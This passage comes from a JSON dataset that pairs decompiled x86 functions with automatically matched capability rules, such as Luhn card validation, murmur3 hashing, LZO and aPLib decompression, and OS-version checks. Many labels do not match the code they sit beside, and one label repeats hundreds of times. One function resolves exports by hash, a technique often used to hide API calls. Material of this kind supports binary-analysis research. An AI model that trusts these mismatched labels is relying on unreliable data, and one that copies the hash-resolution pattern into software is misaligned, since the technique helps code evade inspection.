        "decompiled_code": "\nint32_t __cdecl fcn.00416b9d(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 765
    },
    "0041b6d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b6d5(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6);\n    var_4h = 0x80000000;\n    uVar3 = uVar1 >> 4;\n    uVar4 = uVar3 & 0x7ff;\n    uVar2 = *arg_ch;\n    if ((uVar3 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar2 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 2) = 0;\n            return;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    arg_8h[1] = uVar2 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    *arg_8h = uVar2 << 0xb;\n    while (var_4h == 0) {\n        uVar2 = arg_8h[1];\n        uVar4 = uVar4 - 1;\n        arg_8h[1] = uVar2 << 1 | *arg_8h >> 0x1f;\n        *arg_8h = *arg_8h * 2;\n        var_4h = uVar2 << 1 & 0x80000000;\n    }\n    *(arg_8h + 2) = uVar1 & 0x8000 | uVar4;\n    return;\n}\n",
        "token_count": 482
    },
    "0041f1bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.0041f1bd(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *param_1 = uVar1 * 2;\n    param_1[1] = uVar2 * 2 | uVar1 >> 0x1f;\n    param_1[2] = param_1[2] << 1 | uVar2 >> 0x1f;\n    return;\n}\n",
        "token_count": 127
    },
    "004099e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/3c11c79f25554a4cae0a51d287295f58"
        ],
        "decompiled_code": "\nint32_t fcn.004099e0(int32_t param_1, uint32_t param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    \n    iVar6 = *(*(*0x4630ec + param_1) + *0x4630f0 + param_1) + param_1;\n    uVar3 = *(*0x4630f4 + iVar6);\n    iVar4 = *(*0x4630f8 + iVar6);\n    iVar5 = *(*0x4630fc + iVar6);\n    iVar6 = *(*0x463100 + iVar6);\n    uVar11 = 0;\n    if (uVar3 != 0) {\n        do {\n            iVar7 = *(iVar5 + param_1 + uVar11 * 4) + param_1;\n            iVar9 = 0;\n            do {\n                pcVar1 = iVar9 + iVar7;\n                iVar9 = iVar9 + 1;\n            } while (*pcVar1 != '\\0');\n            puVar8 = fcn.004098e0(*0x4630cc, iVar7, iVar9);\n            uVar10 = 0;\n            do {\n                uVar10 = *puVar8 + (uVar10 << 0x13 | uVar10 >> 0xd);\n                uVar2 = *puVar8;\n                puVar8 = puVar8 + 1;\n            } while (uVar2 != 0);\n        } while ((uVar10 != param_2) && (uVar11 = uVar11 + 1,  uVar11 < uVar3));\n    }\n    if (uVar11 != uVar3) {\n        return *(iVar4 + param_1 + *(iVar6 + param_1 + uVar11 * 2) * 4) + param_1;\n    }\n    return 0;\n}\n",
        "token_count": 477
    },
    "00412301": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00412393: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00412398)\n// WARNING: Removing unreachable block (ram,0x004123be)\n// WARNING: Removing unreachable block (ram,0x0041239d)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412301(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00412580(0x455dc0, 8);\n    fcn.00416625(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4670c8 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x4670c4 = 1;\n    *0x4670c0 = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x468948 != NULL) {\n            while( true ) {\n                *0x468944 = *0x468944 + -1;\n                if (*0x468944 < *0x468948) break;\n                if (**0x468944 != NULL) {\n                    (***0x468944)();\n                }\n            }\n        }\n        fcn.00412261(0x463098);\n    }\n    fcn.00412261(0x4630a4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00416558(8);\n    }\n    return;\n}\n",
        "token_count": 433
    },
    "0041b22c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041b22c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = param_1 + (param_2 / 0x20) * 4;\n    iVar1 = fcn.0041f13e(*puVar3, 1 << (0x1fU - param_2 % 0x20 & 0x1f), puVar3);\n    iVar2 = param_2 / 0x20 + -1;\n    if (-1 < iVar2) {\n        puVar3 = param_1 + iVar2 * 4;\n        do {\n            if (iVar1 == 0) {\n                return;\n            }\n            iVar1 = fcn.0041f13e(*puVar3, 1, puVar3);\n            iVar2 = iVar2 + -1;\n            puVar3 = puVar3 + -1;\n        } while (-1 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00410984": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410984(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00414426(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0040c05d": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040c05d(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    if (param_2 == 0) {\n        *param_1 = 0;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_2);\n        iVar3 = (iVar1 + 1) * 2;\n        if (0x80 < iVar3) {\n            iVar2 = fcn.0041101f(iVar3);\n            *param_1 = iVar2;\n            if (iVar2 == 0) {\n                fcn.00401100(0x8007000e);\n            }\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                          (param_2, 0, unaff_retaddr, iVar1 + 1, *param_1, iVar3, 0, 0);\n        if (iVar3 == 0) {\n            fcn.00403ab0();\n        }\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "0040ca24": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ca24(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            in_ECX[4] = -(arg_8h != 0);\n            return;\n        }\n        if (arg_ch == 0x16) {\n            *in_ECX = 0x16;\n        }\n        else if (arg_ch == 0x17) {\n            *in_ECX = 0x17;\n        }\n        else if (arg_ch == 0x19) {\n            *in_ECX = 0x19;\n        }\n        else if (arg_ch == 0x13) {\n            *in_ECX = 0x13;\n        }\n        else {\n            *in_ECX = 3;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 237
    },
    "0041bd99": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
